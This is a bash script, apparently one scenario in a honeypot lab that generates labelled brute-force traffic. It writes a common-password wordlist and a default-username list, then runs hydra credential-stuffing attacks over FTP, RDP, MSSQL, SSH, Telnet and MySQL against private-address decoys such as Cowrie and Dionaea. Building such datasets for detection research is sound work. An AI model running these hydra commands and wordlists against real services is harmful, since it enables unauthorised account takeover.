#!/bin/bash
# 시나리오 08: 자격증명 스터핑 (다중 서비스)
# Label: Brute Force
# 도구: hydra, curl
# 설명: OpenCanary(FTP/RDP), Dionaea(FTP/MSSQL), Cowrie(다중 사용자) 대상 자격증명 스터핑

LABEL="Brute Force"
SCENARIO="credential_stuffing"
echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"start\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"

# 확장 패스워드 리스트
WORDLIST="/tmp/passwords_ext.txt"
cat > "$WORDLIST" << 'EOF'
password
123456
admin
root
letmein
qwerty
monkey
master
password1
12345678
abc123
iloveyou
hello
secret
1234
admin123
password123
test
user
guest
pass
login
welcome
dragon
sunshine
princess
shadow
superman
michael
football
baseball
soccer
charlie
donald
hunter
ranger
batman
trustno1
access
passw0rd
p@ssword
Pa$$w0rd
P@ssw0rd
admin@123
root123
toor
pass123
123abc
000000
111111
696969
123123
121212
123321
654321
qwerty123
EOF

# 사용자 리스트
cat > /tmp/users.txt << 'EOF'
admin
root
pi
ubuntu
oracle
git
deploy
backup
www-data
mysql
postgres
apache
nginx
test
user
guest
operator
support
service
EOF

echo "[*] FTP brute force against OpenCanary (172.30.0.12:21)"
hydra -L /tmp/users.txt -P "$WORDLIST" \
    -t 4 -f \
    -o /honeypot_logs/hydra_ftp_opencanary.txt \
    ftp://172.30.0.12 \
    2>/dev/null || true

echo "[*] RDP brute force against OpenCanary (172.30.0.12:3389)"
hydra -L /tmp/users.txt -P "$WORDLIST" \
    -t 4 \
    -o /honeypot_logs/hydra_rdp.txt \
    rdp://172.30.0.12 \
    2>/dev/null || true

echo "[*] FTP brute force against Dionaea (172.30.0.14:21)"
hydra -L /tmp/users.txt -P "$WORDLIST" \
    -t 4 -f \
    -o /honeypot_logs/hydra_ftp_dionaea.txt \
    ftp://172.30.0.14 \
    2>/dev/null || true

echo "[*] MSSQL brute force against Dionaea (172.30.0.14:1433)"
hydra -l sa -P "$WORDLIST" \
    -t 4 \
    -o /honeypot_logs/hydra_mssql.txt \
    mssql://172.30.0.14 \
    2>/dev/null || true

hydra -l admin -P "$WORDLIST" \
    -t 4 \
    mssql://172.30.0.14 \
    2>/dev/null || true

echo "[*] SSH brute force against Cowrie - extended user list"
for user in pi ubuntu oracle git deploy backup www-data mysql postgres operator; do
    hydra -l "$user" -P "$WORDLIST" \
        -t 4 -f \
        -o "/honeypot_logs/hydra_ssh_${user}.txt" \
        ssh://172.30.0.10:2222 \
        -e nsr 2>/dev/null || true
done

echo "[*] Telnet credential stuffing against Cowrie (172.30.0.10:2223)"
for user in root admin pi ubuntu; do
    hydra -l "$user" -P "$WORDLIST" \
        -t 4 -f \
        telnet://172.30.0.10:2223 \
        2>/dev/null || true
done

echo "[*] MySQL credential stuffing against Heralding (172.30.0.11:3306)"
for user in root admin mysql dba; do
    hydra -l "$user" -P "$WORDLIST" \
        -t 4 -f \
        mysql://172.30.0.11:3306 \
        2>/dev/null || true
done

echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"end\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
